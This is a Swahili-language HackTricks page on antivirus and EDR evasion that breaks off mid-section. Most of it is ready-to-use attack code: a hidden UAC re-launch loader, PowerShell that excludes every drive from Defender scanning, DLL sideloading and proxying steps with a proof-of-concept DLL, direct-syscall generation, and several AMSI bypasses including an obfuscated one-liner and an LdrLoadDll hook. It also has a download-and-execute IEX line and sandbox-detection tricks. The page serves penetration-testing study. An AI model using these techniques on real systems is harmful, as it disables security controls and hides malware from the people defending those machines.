# Kupita Antivirus (AV)

{{#include ../banners/hacktricks-training.md}}

**Ukurasa huu uliandikwa awali na** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Kusimamisha Defender

- [defendnot](https://github.com/es3n1n/defendnot): Zana ya kusimamisha Windows Defender kufanya kazi.
- [no-defender](https://github.com/es3n1n/no-defender): Zana ya kusimamisha Windows Defender kufanya kazi kwa kujifanya antivirus nyingine.
- [Zima Defender ikiwa wewe ni admin](basic-powershell-for-pentesters/README.md)

### Ulaghai wa UAC wa mtindo wa kisakinishi kabla ya kuingilia Defender

Loaders za umma zinazojifanya cheats za michezo mara nyingi huja kama visakinishi vya Node.js/Nexe visivyosainiwa ambavyo kwanza **humwomba mtumiaji ruhusa za juu** na ndipo hudhoofisha Defender. Mchakato ni rahisi:

1. Kagua kama kuna muktadha wa kiutawala kwa kutumia `net session`. Amri hii hufaulu tu pale anayeiendesha ana haki za admin, kwa hiyo ikishindwa inaonyesha kuwa loader inaendeshwa na mtumiaji wa kawaida.
2. Ijiwashe upya mara moja kwa kutumia kitenzi cha `RunAs` ili kuonyesha kidokezo cha idhini cha UAC kinachotarajiwa huku ikihifadhi command line ya awali.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Waathiriwa tayari wanaamini kuwa wanasakinisha software “iliyopasuliwa”, kwa hiyo kwa kawaida wanakubali kidokezo hicho, na hivyo kuipa malware ruhusa zinazohitajika kubadilisha sera ya Defender.<sup>[[26]](#references)</sup>

### Vighairi vya `MpPreference` kwa kila herufi ya kiendeshi

Baada ya kupata ruhusa za juu, minyororo ya mashambulizi ya mtindo wa GachiLoader huongeza maeneo yasiyoonekana na Defender badala ya kuzima huduma hiyo moja kwa moja. Loader kwanza huua programu ya GUI inayofuatilia huduma (`taskkill /F /IM SecHealthUI.exe`) kisha huweka **vighairi vipana mno** ili kila wasifu wa mtumiaji, saraka ya mfumo na diski inayoweza kuondolewa isiweze kuchanganuliwa:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Key observations:

- Mzunguko hupitia kila filesystem iliyowekwa (D:\, E:\, vijiti vya USB, n.k.), kwa hiyo **payload yoyote ya baadaye itakayowekwa popote kwenye diski itapuuzwa**.
- Kutenga kiendelezi cha `.sys` ni hatua ya baadaye—washambuliaji huhifadhi chaguo la kupakia drivers zisizosainiwa baadaye bila kugusa Defender tena.
- Mabadiliko yote huwekwa chini ya `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, hivyo hatua zinazofuata zinaweza kuthibitisha kuwa vizuizi vimedumu au kuvipanua bila kuanzisha UAC tena.

Kwa kuwa hakuna huduma ya Defender inayosimamishwa, ukaguzi wa kawaida wa afya huendelea kuripoti “antivirus active” ingawa ukaguzi wa wakati halisi haukagui kabisa njia hizo.<sup>[[26]](#references)</sup>

## **Mbinu za AV Evasion**

Kwa sasa, AV hutumia mbinu mbalimbali kuangalia kama faili ni hasidi au la: static detection, dynamic analysis na, kwa EDR za hali ya juu zaidi, behavioural analysis.

### **Static detection**

Static detection hufanyika kwa kutambua mifuatano ya herufi au safu za byte hasidi zinazojulikana ndani ya binary au script, na pia kutoa taarifa kutoka kwenye faili yenyewe (kwa mfano, maelezo ya faili, jina la kampuni, saini za kidijitali, ikoni, checksum, n.k.). Hii ina maana kwamba kutumia zana za umma zinazojulikana kunaweza kusababisha ugunduliwe kwa urahisi zaidi, kwa kuwa huenda tayari zimechanganuliwa na kutambuliwa kuwa hasidi. Kuna njia kadhaa za kukwepa aina hii ya ugunduzi:

- **Encryption**

Ukisimba binary kwa njia fiche, AV haitaweza kutambua programu yako, lakini utahitaji aina fulani ya loader ili kuifungua na kuiendesha kwenye memory.

- **Obfuscation**

Wakati mwingine unachohitaji ni kubadilisha baadhi ya mifuatano ya herufi kwenye binary au script yako ili ipite AV, lakini hili linaweza kuchukua muda kutegemea unachojaribu kuficha.

- **Custom tooling**

Ukitengeneza zana zako mwenyewe, hakutakuwa na signatures zinazojulikana kuwa mbaya, lakini hili huchukua muda na juhudi nyingi.

> [!TIP]
> Njia nzuri ya kuangalia dhidi ya ugunduzi tuli wa Windows Defender ni kutumia [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Kimsingi, hugawa faili katika sehemu kadhaa na kisha kuagiza Defender ichanganue kila sehemu kivyake. Kwa njia hii, inaweza kukuambia hasa ni mifuatano gani ya herufi au byte kwenye binary yako iliyotambuliwa.

Ninakupendekezea sana uangalie [orodha hii ya YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) kuhusu AV Evasion kwa vitendo.

### Majaribio ya vipengele vya PE nje ya mtandao kwa static classifiers

Byte za payload zilizofungashwa au zilizosimbwa kwa njia fiche ni ingizo moja tu kati ya yanayotumiwa na static classifier. EMBER2024 hutoa vipengele vya PE ikiwemo imports, exports, sections, headers na data ya Authenticode.<sup>[[48]](#references)</sup> Katika jaribio moja la loader, kuongeza imports 141 zilizoonekana kuwa zisizo na madhara kulipunguza alama ya uovu ya EMBER2024 kwa 93%, ilhali imports zinazohusishwa na malware ziliiongeza. Haya ni matokeo ya model hiyo na sampuli hizo, si njia ya uhakika ya kukwepa bidhaa fulani ya AV/EDR.<sup>[[50]](#references)</sup>

Kwa jaribio la loader lililoidhinishwa, weka payload na njia ya utekelezaji bila kubadilika, badilisha kigezo kimoja tu cha build kilichokusudiwa kwa kila toleo, kisha linganisha alama nje ya mtandao. Kagua vipengele vya PE vinavyotokana na hilo kwa sababu mabadiliko ya build yanaweza kuathiri zaidi ya kundi moja la vipengele.<sup>[[49]](#references)[[50]](#references)</sup> Ili kuweka imports zilizokusudiwa kwenye IAT, ita Win32 APIs ulizochagua kutoka kwenye code inayoweza kufikiwa. Badilisha chaguo na sambaza sehemu za miito katika builds tofauti badala ya kuunda camouflage function isiyobadilika ambayo inaweza kuwa signature. Jaribio hilo pia liliripoti alama za chini zaidi kwa kutumia code signing halali, export entries na kuongeza functions zinazopanua `.pdata`; signing batili haikuwa na athari kubwa, na athari ya `.pdata` ilikuwa ndogo.<sup>[[50]](#references)</sup>

Package ya `thrember` hutoa feature extraction na benchmark models. Baada ya kuisakinisha, tumia `thrember.download_models("models")` ukiwa na directory ya `models` iliyopo, kisha endesha scorer ukiwa kwenye directory yake ya mzazi: helper ya upakuaji hubadilisha working directory ya sasa. PE classifier inaweza kutoa alama kwa directory yenye builds bila kuziwasilisha kwenye huduma ya scanning:<sup>[[48]](#references)</sup>

```python
from pathlib import Path
import lightgbm as lgb
import thrember

model = lgb.Booster(model_file="models/EMBER2024_PE.model")
for sample in sorted(Path("builds").glob("*.exe")):
    print(sample, thrember.predict_sample(model, sample.read_bytes()))
```

Weka matoleo ya model na feature-extractor bila kubadilika wakati wa kulinganisha. Alama ya chini katika uchanganuzi wa offline inaonyesha tu jinsi classifier hii inavyoitikia binary iliyobadilishwa; haithibitishi kuwa imeepuka uchanganuzi wa tabia, emulation, au model tofauti ya vendor.<sup>[[49]](#references)[[50]](#references)</sup> Kwa [per-build polymorphism na outer-binary camouflage katika payloads zilizovirtualishwa](virtualized-payload-execution.md#camouflaging-the-outer-go-executable), angalia execution model tofauti.

### **Uchambuzi wa Dynamic**

Uchambuzi wa Dynamic ni pale AV inapoendesha binary yako kwenye sandbox na kufuatilia shughuli hasidi (kwa mfano, kujaribu kusimbua na kusoma manenosiri ya browser yako, kufanya minidump ya LSASS, n.k.). Sehemu hii inaweza kuwa ngumu zaidi kushughulikia, lakini haya ni baadhi ya mambo unayoweza kufanya ili kukwepa sandboxes.

- **Lala kabla ya kuanza kutekeleza** Kulingana na jinsi ilivyotekelezwa, hii inaweza kuwa njia nzuri ya kukwepa uchanganuzi wa dynamic wa AV. AVs huwa na muda mfupi sana wa kuchanganua files ili zisiwe kikwazo kwa mtiririko wa kazi wa mtumiaji, kwa hiyo kutumia muda mrefu wa kusubiri kunaweza kuvuruga uchanganuzi wa binaries. Tatizo ni kwamba sandboxes nyingi za AV zinaweza kuruka muda huo wa kusubiri, kutegemea jinsi ulivyotekelezwa.
- **Kukagua rasilimali za mashine** Kwa kawaida, Sandboxes huwa na rasilimali chache sana za kutumia (kwa mfano, < 2GB RAM); vinginevyo zinaweza kupunguza kasi ya mashine ya mtumiaji. Unaweza pia kutumia ubunifu mkubwa hapa, kwa mfano, kukagua halijoto ya CPU au hata kasi ya feni; si kila kitu kitatekelezwa kwenye sandbox.
- **Ukaguzi maalum wa mashine** Ikiwa unataka kulenga mtumiaji ambaye workstation yake imeunganishwa kwenye domain ya "contoso.local", unaweza kukagua domain ya computer ili kuona kama inalingana na uliyobainisha. Isipolingana, unaweza kufanya program yako itoke.

Imebainika kuwa computername ya Microsoft Defender's Sandbox ni HAL9TH. Kwa hiyo, unaweza kukagua jina la computer kwenye malware yako kabla ya detonation. Jina likiwa HAL9TH, inamaanisha uko ndani ya defender's sandbox, kwa hiyo unaweza kufanya program yako itoke.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>chanzo: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Vidokezo vingine vizuri sana kutoka kwa [@mgeeky](https://twitter.com/mariuszbit) vya kukabiliana na Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> chaneli ya #malware-dev</p></figcaption></figure>

Kama tulivyosema awali kwenye chapisho hili, **public tools** hatimaye **hugunduliwa**, kwa hiyo unapaswa kujiuliza jambo moja:

Kwa mfano, ikiwa unataka kufanya dump ya LSASS, **unahitaji kweli kutumia mimikatz**? Au unaweza kutumia project nyingine isiyojulikana sana ambayo pia hufanya dump ya LSASS?

Huenda jibu sahihi ni chaguo la pili. Tukitumia mimikatz kama mfano, huenda ni mojawapo ya malware zinazowekwa alama zaidi na AVs na EDRs, au ndiyo yenye alama nyingi zaidi. Ingawa project yenyewe ni nzuri sana, pia ni ndoto mbaya kufanya nayo kazi ili kukwepa AVs, kwa hiyo tafuta tu mbadala wa kile unachojaribu kutimiza.

> [!TIP]
> Unapobadilisha payloads zako ili kukwepa detection, hakikisha **unazima automatic sample submission** kwenye defender, na tafadhali, kwa uzito, **USIPAKIE KWENYE VIRUSTOTAL** ikiwa lengo lako ni kufanikisha evasion kwa muda mrefu. Ikiwa unataka kuangalia kama AV fulani inagundua payload yako, isakinishe kwenye VM, jaribu kuzima automatic sample submission, kisha ifanyie majaribio hapo hadi uridhike na matokeo.

## EXEs dhidi ya DLLs

Inapowezekana, **weka kipaumbele kutumia DLLs kwa evasion** kila wakati. Kulingana na uzoefu wangu, DLL files kwa kawaida **hugunduliwa na kuchanganuliwa kwa kiwango kidogo zaidi**, kwa hiyo ni hila rahisi sana kutumia ili kuepuka detection katika baadhi ya hali (ikiwa payload yako ina njia ya kufanya kazi kama DLL, bila shaka).

Kama tunavyoona kwenye picha hii, DLL Payload kutoka Havoc ina kiwango cha detection cha 4/26 kwenye antiscan.me, ilhali EXE payload ina kiwango cha detection cha 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>ulinganisho wa antiscan.me kati ya Havoc EXE payload ya kawaida na Havoc DLL ya kawaida</p></figcaption></figure>

Sasa tutaonyesha hila kadhaa unazoweza kutumia na DLL files ili kujificha zaidi.

## DLL Sideloading & Proxying

**DLL Sideloading** hutumia mpangilio wa utafutaji wa DLL unaotumiwa na loader kwa kuweka application ya mwathiriwa na payload(s) hasidi pamoja.

Unaweza kutafuta programs zinazoweza kuathiriwa na DLL Sideloading kwa kutumia [Siofra](https://github.com/Cybereason/siofra) na script ifuatayo ya powershell:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Amri hii itatoa orodha ya programu zilizo katika "C:\Program Files\\" zinazoweza kuathiriwa na DLL hijacking, pamoja na faili za DLL wanazojaribu kupakia.

Ninakupendekeza sana **uchunguze mwenyewe programu zinazoweza kuathiriwa na DLL hijacking/sideloading**. Mbinu hii inaweza kuwa fiche sana ikitekelezwa vizuri, lakini ukitumia programu zinazojulikana hadharani zinazoweza kutumia DLL sideloading, unaweza kugundulika kwa urahisi.

Kuweka tu DLL hasidi yenye jina ambalo programu inatarajia kupakia hakutapakia payload yako, kwa sababu programu inatarajia kuwe na functions maalum ndani ya DLL hiyo. Ili kurekebisha tatizo hili, tutatumia mbinu nyingine inayoitwa **DLL Proxying/Forwarding**.

**DLL Proxying** huelekeza calls ambazo programu hufanya kutoka kwenye proxy DLL (iliyo hasidi) kwenda kwenye DLL halisi. Hivyo, utendaji wa programu huhifadhiwa na tunaweza kushughulikia utekelezaji wa payload yako.

Nitatumia mradi wa [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) kutoka kwa [@flangvik](https://twitter.com/Flangvik/)

Hizi ndizo hatua nilizofuata:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

Amri ya mwisho itatupatia faili 2: kiolezo cha msimbo wa chanzo cha DLL, na DLL ya awali iliyopewa jina jipya.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Hizi ndizo matokeo:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Shellcode yetu (iliyosimbwa kwa [SGN](https://github.com/EgeBalci/sgn)) na proxy DLL zote zina kiwango cha Detection cha 0/26 kwenye [antiscan.me](https://antiscan.me)! Ningesema huo ni mafanikio.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Ninakupendekezea sana** utazame [twitch VOD ya S3cur3Th1sSh1t](https://www.twitch.tv/videos/1644171543) kuhusu DLL Sideloading na pia [video ya ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE) ili ujifunze zaidi kwa kina kuhusu tuliyojadili.

### Kutumia Vibaya Forwarded Exports (ForwardSideLoading)

Moduli za Windows PE zinaweza ku-export functions ambazo kwa hakika ni "forwarders": badala ya kuelekeza kwenye code, ingizo la export huwa na string ya ASCII yenye muundo wa `TargetDll.TargetFunc`. Mteja anapotafuta export hiyo, Windows loader itafanya yafuatayo:

- Itapakia `TargetDll` ikiwa bado haijapakiwa
- Itatafuta `TargetFunc` ndani yake

Tabia muhimu za kuelewa:
- Ikiwa `TargetDll` ni KnownDLL, hutolewa kutoka kwenye namespace iliyolindwa ya KnownDLLs (kwa mfano, ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Ikiwa `TargetDll` si KnownDLL, hutumika mpangilio wa kawaida wa kutafuta DLL, unaojumuisha directory ya moduli inayofanya forward resolution.

Hii huwezesha primitive ya indirect sideloading: tafuta DLL iliyosainiwa ambayo hu-forward function kwenda kwenye jina la moduli isiyo KnownDLL, kisha iweke DLL hiyo pamoja na DLL inayodhibitiwa na mshambuliaji na iliyopewa jina linalolingana kabisa na moduli lengwa lililo-forwardiwa. Forwarded export inapotumika, loader hutatua forward hiyo na kupakia DLL yako kutoka kwenye directory hiyo hiyo, na kutekeleza DllMain yako.<sup>[[13]](#references)</sup>

Mfano ulioonekana kwenye Windows 11:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` si KnownDLL, kwa hivyo hutafutwa kwa kutumia mpangilio wa kawaida wa utafutaji.

PoC (nakili-bandika):
1) Nakili system DLL iliyosainiwa kwenye folda inayoweza kuandikika.
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Weka `NCRYPTPROV.dll` hasidi kwenye folda hiyo hiyo. `DllMain` ya msingi inatosha kutekeleza code; huhitaji kutekeleza function iliyoforwardiwa ili kuanzisha `DllMain`.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Anzisha forward kwa kutumia LOLBin iliyotiwa saini:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Tabia iliyozingatiwa:
- rundll32 (signed) hupakia `keyiso.dll` ya side-by-side (signed)
- Wakati wa kutatua `KeyIsoSetAuditingInterface`, loader hufuata forward hadi `NCRYPTPROV.SetAuditingInterface`
- Kisha loader hupakia `NCRYPTPROV.dll` kutoka `C:\test` na kutekeleza `DllMain` yake
- Ikiwa `SetAuditingInterface` haijatekelezwa, utapata hitilafu ya "missing API" baada tu ya `DllMain` kuendeshwa

Vidokezo vya kutafuta:
- Lenga forwarded exports ambapo target module si KnownDLL. KnownDLLs zimeorodheshwa chini ya `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Unaweza kuorodhesha forwarded exports kwa kutumia zana kama:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Tazama orodha ya Windows 11 forwarder ili kutafuta zinazoweza kufaa: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Mawazo ya kugundua/kulinda:
- Fuatilia LOLBins (kwa mfano, rundll32.exe) zinazopakia DLL zilizosainiwa kutoka njia zisizo za mfumo, kisha kupakia non-KnownDLLs zenye jina msingi lilelile kutoka saraka hiyo
- Toa arifa kuhusu minyororo ya mchakato/moduli kama: `rundll32.exe` → `keyiso.dll` isiyo ya mfumo → `NCRYPTPROV.dll` ndani ya njia zinazoweza kuandikiwa na mtumiaji
- Tekeleza sera za code integrity (WDAC/AppLocker) na uzuie write+execute kwenye saraka za programu

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze ni toolkit ya payload ya kukwepa EDRs kwa kutumia michakato iliyosimamishwa, direct syscalls na njia mbadala za utekelezaji`

Unaweza kutumia Freeze kupakia na kutekeleza shellcode yako kwa njia fiche.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion ni mchezo wa paka na panya tu: kinachofanya kazi leo kinaweza kugunduliwa kesho, kwa hivyo usitegemee zana moja tu; ikiwezekana, jaribu kuunganisha mbinu nyingi za evasion.

## Direct/Indirect Syscalls & Utatuzi wa SSN (SysWhispers4)

EDR mara nyingi huweka **user-mode inline hooks** kwenye syscall stubs za `ntdll.dll`. Ili kupita hooks hizo, unaweza kutengeneza **direct** au **indirect** syscall stubs zinazopakia **SSN** (System Service Number) sahihi na kuhamia kernel mode bila kutekeleza export entrypoint iliyowekewa hook.<sup>[[32]](#references)</sup>

**Chaguo za invocation:**
- **Direct (embedded)**: weka instruction ya `syscall`/`sysenter`/`SVC #0` kwenye stub iliyotengenezwa (hakuna export ya `ntdll` inayofikiwa).
- **Indirect**: ruka hadi kwenye `syscall` gadget iliyopo ndani ya `ntdll` ili mabadiliko ya kwenda kernel yaonekane kana kwamba yametoka `ntdll` (hufaa kwa kukwepa heuristic); **randomized indirect** huchagua gadget kutoka kwenye pool kwa kila call.
- **Egg-hunt**: epuka kuweka mfuatano tuli wa opcode `0F 05` kwenye diski; tambua mfuatano wa syscall wakati wa runtime.

**Mikakati ya utatuzi wa SSN inayostahimili hooks:**
- **FreshyCalls (VA sort)**: kadiria SSN kwa kupanga syscall stubs kwa virtual address badala ya kusoma bytes za stub.
- **SyscallsFromDisk**: map `\KnownDlls\ntdll.dll` safi, soma SSN kutoka kwenye `.text` yake, kisha uiondoe kwenye memory (hupita hooks zote zilizo kwenye memory).
- **RecycledGate**: unganisha ukadiriaji wa SSN kwa kupanga VA na uthibitishaji wa opcode wakati stub iko safi; tumia ukadiriaji wa VA kama njia mbadala ikiwa imewekewa hook.
- **HW Breakpoint**: weka DR0 kwenye instruction ya `syscall` na utumie VEH kunasa SSN kutoka `EAX` wakati wa runtime, bila kuchanganua bytes zilizowekewa hook.

Mfano wa matumizi ya SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

AMSI iliundwa kuzuia "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Awali, AVs ziliweza kuchanganua **files zilizo kwenye diski** pekee, kwa hiyo ikiwa ungeweza kutekeleza payloads **moja kwa moja kwenye memory**, AV isingeweza kufanya chochote kuizuia, kwa kuwa isingekuwa na mwonekano wa kutosha.

Kipengele cha AMSI kimeunganishwa katika vipengele hivi vya Windows.

- User Account Control, au UAC (uinuaji wa ruhusa za EXE, COM, MSI, au usakinishaji wa ActiveX)
- PowerShell (scripts, matumizi ya mwingiliano, na tathmini ya code inayobadilika)
- Windows Script Host (wscript.exe na cscript.exe)
- JavaScript na VBScript
- Macros za Office VBA

Huwezesha suluhisho za antivirus kukagua tabia ya script kwa kuonyesha maudhui ya script katika hali ambayo haijasimbwa kwa usimbaji fiche wala kufichwa.

Kuendesha `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` kutazalisha alert ifuatayo kwenye Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Ona jinsi inavyoongeza `amsi:` mwanzoni, ikifuatiwa na path ya executable ambayo script ilitekelezwa kutoka humo; katika hali hii, powershell.exe

Hatukuandika file lolote kwenye diski, lakini bado tuligunduliwa kwenye memory kwa sababu ya AMSI.

Zaidi ya hayo, kuanzia **.NET 4.8**, code ya C# pia hupitia AMSI. Hii huathiri hata `Assembly.Load(byte[])` inayotumika kupakia utekelezaji kwenye memory. Ndiyo sababu kutumia matoleo ya chini ya .NET (kama 4.7.2 au ya chini) kunapendekezwa kwa utekelezaji kwenye memory ikiwa unataka kukwepa AMSI.

Kuna njia kadhaa za kukwepa AMSI:

- **Obfuscation**

Kwa kuwa AMSI hufanya kazi hasa kwa kutumia ugunduzi tuli, kurekebisha scripts unazojaribu kupakia kunaweza kuwa njia nzuri ya kukwepa ugunduzi.

Hata hivyo, AMSI inaweza kufafanua scripts zilizofichwa hata zikiwa na tabaka nyingi, kwa hiyo obfuscation inaweza kuwa chaguo baya kutegemea jinsi inavyofanywa. Hii hufanya kukwepa isiwe rahisi moja kwa moja. Ingawa, wakati mwingine unachohitaji ni kubadilisha majina ya variables kadhaa tu, na utakuwa salama; kwa hiyo hutegemea kiwango ambacho kitu kimewekewa alama.

- **AMSI Bypass**

Kwa kuwa AMSI hutekelezwa kwa kupakia DLL ndani ya mchakato wa powershell (pia cscript.exe, wscript.exe, n.k.), inawezekana kuibadilisha kwa urahisi, hata ukiendesha kama mtumiaji asiye na ruhusa za juu. Kutokana na dosari hii katika utekelezaji wa AMSI, watafiti wamegundua njia nyingi za kukwepa uchanganuzi wa AMSI.

**Kulazimisha Hitilafu**

Kulazimisha uanzishaji wa AMSI ushindwe (amsiInitFailed) kutasababisha uchanganuzi kutoanzishwa kwa mchakato wa sasa. Hili lilifichuliwa awali na [Matt Graeber](https://twitter.com/mattifestation), na Microsoft imeunda signature ili kuzuia matumizi yake kuenea.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Kilichohitajika tu ni mstari mmoja wa powershell code ili kufanya AMSI isiweze kutumika katika mchakato wa sasa wa powershell. Bila shaka, mstari huu umetambuliwa na AMSI yenyewe, kwa hiyo unahitaji marekebisho fulani ili kutumia mbinu hii.

Huu hapa ni AMSI bypass iliyorekebishwa niliyoipata kwenye [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Kumbuka, huenda hii itaflagiwa pindi chapisho hili litakapotolewa, kwa hivyo hupaswi kuchapisha code yoyote ikiwa mpango wako ni kubaki bila kugunduliwa.

**Memory Patching**

Mbinu hii iligunduliwa awali na [@RastaMouse](https://twitter.com/_RastaMouse/) na inahusisha kutafuta address ya function ya "AmsiScanBuffer" katika amsi.dll (inayohusika na kuchanganua input iliyotolewa na mtumiaji) na kuiandikia upya kwa instructions za kurudisha code ya E_INVALIDARG. Kwa njia hii, matokeo ya scan halisi yatakuwa 0, ambayo huchukuliwa kuwa matokeo safi.

> [!TIP]
> Tafadhali soma [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) ili kupata maelezo zaidi.

Pia kuna mbinu nyingine nyingi zinazotumika kupita AMSI kwa kutumia powershell. Tazama [**ukurasa huu**](basic-powershell-for-pentesters/index.html#amsi-bypass) na [**repo hii**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) ili kujifunza zaidi kuzihusu.

### Kuzuia AMSI kwa kuzuia amsi.dll kupakiwa (LdrLoadDll hook)

AMSI huanzishwa tu baada ya `amsi.dll` kupakiwa katika process ya sasa. Njia thabiti ya bypass isiyofungamana na lugha ni kuweka user-mode hook kwenye `ntdll!LdrLoadDll` ambayo hurudisha hitilafu wakati module inayoombwa ni `amsi.dll`. Kwa hiyo, AMSI haipakii kamwe na hakuna scans zinazofanyika kwa process hiyo.<sup>[[23]](#references)</sup>

Muhtasari wa utekelezaji (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Maelezo
- Hufanya kazi katika PowerShell, WScript/CScript na custom loaders (chochote ambacho kingepakia AMSI).
- Tumia pamoja na kutuma scripts kupitia stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) ili kuepuka mabaki marefu kwenye command line.
- Imeonekana ikitumiwa na loaders zinazoendeshwa kupitia LOLBins (kwa mfano, `regsvr32` ikiita `DllRegisterServer`).

Zana **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** pia hutengeneza script ya kubypass AMSI.
Zana **[https://amsibypass.com/](https://amsibypass.com/)** pia hutengeneza script ya kubypass AMSI na kuepuka signature kwa kutumia function zilizobainishwa na mtumiaji na kubadilishwa nasibu, variables, character expressions, na kutumia herufi kubwa na ndogo zilizochanganywa kwa nasibu kwenye keywords za PowerShell ili kuepuka signature.

**Ondoa signature iliyotambuliwa**

